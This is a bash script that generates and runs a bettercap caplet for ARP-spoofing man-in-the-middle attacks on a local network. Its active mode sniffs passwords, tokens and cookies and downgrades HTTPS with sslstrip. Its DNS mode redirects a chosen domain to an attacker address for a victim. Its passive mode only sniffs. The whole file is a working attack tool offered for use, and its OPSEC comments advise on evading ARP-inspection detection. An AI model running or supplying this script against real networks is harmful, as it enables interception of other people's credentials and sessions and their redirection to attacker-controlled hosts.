#!/usr/bin/env bash
# bettercap_mitm.sh - Generate and run a bettercap caplet for ARP-spoof MitM
# with DNS spoofing, HSTS-bypass (sslstrip2 via the http.proxy), and full
# credential/cookie sniffing. Also covers a passive sniff-only mode.
#
# USAGE:
#   sudo ./bettercap_mitm.sh active  <iface> <target_ip>[,<ip2>...] [gateway_ip]
#   sudo ./bettercap_mitm.sh passive <iface>
#   sudo ./bettercap_mitm.sh dns     <iface> <target_ip> <spoof_domain> <attacker_ip>
#
# DEPENDENCIES: bettercap (>=2.32), root, IP forwarding (caplet enables it).
#
# OPSEC: ARP spoofing rewrites the victim+gateway ARP caches -> arpwatch /
#   XArp / switch DAI (Dynamic ARP Inspection) will flag duplicate-MAC and
#   MAC/IP binding violations. HSTS-preloaded sites cannot be stripped. Use
#   half-duplex (target only, not gateway) to reduce footprint when possible.

set -euo pipefail
MODE="${1:?mode required: active|passive|dns}"
IFACE="${2:?interface required}"
CAPLET="$(mktemp --suffix=.cap)"
trap 'rm -f "$CAPLET"' EXIT

case "$MODE" in
  active)
    TARGETS="${3:?target ip(s) required}"
    GW="${4:-}"
    cat > "$CAPLET" <<EOF
set arp.spoof.targets ${TARGETS}
$( [ -n "$GW" ] && echo "set arp.spoof.gateway ${GW}" )
# fullduplex spoofs both victim and gateway; comment out for stealthier half-duplex
set arp.spoof.fullduplex true
net.probe on
set net.sniff.verbose true
set net.sniff.regexp (?i)(pass|user|login|token|cookie|authorization)
arp.spoof on
net.sniff on
# transparent HTTP proxy with sslstrip-style downgrade (non-HSTS sites only)
set http.proxy.sslstrip true
http.proxy on
EOF
    echo "[*] ARP-spoof MitM on $IFACE targets=$TARGETS gw=${GW:-auto}"
    ;;

  passive)
    cat > "$CAPLET" <<EOF
net.probe on
set net.sniff.verbose true
set net.sniff.local true
net.sniff on
EOF
    echo "[*] Passive sniff on $IFACE (no spoofing, stealthy recon)"
    ;;

  dns)
    TARGET="${3:?target ip required}"
    DOMAIN="${4:?spoof domain required}"
    ATTACKER="${5:?attacker ip required}"
    cat > "$CAPLET" <<EOF
set arp.spoof.targets ${TARGET}
set dns.spoof.domains ${DOMAIN}
set dns.spoof.address ${ATTACKER}
set dns.spoof.all true
net.probe on
arp.spoof on
dns.spoof on
EOF
    echo "[*] ARP+DNS spoof: ${DOMAIN} -> ${ATTACKER} for victim ${TARGET}"
    ;;

  *)
    echo "[!] unknown mode: $MODE"; exit 1 ;;
esac

echo "[*] caplet:"; sed 's/^/    /' "$CAPLET"
echo "[*] launching bettercap (Ctrl-C restores ARP tables on exit)"
exec bettercap -iface "$IFACE" -caplet "$CAPLET"
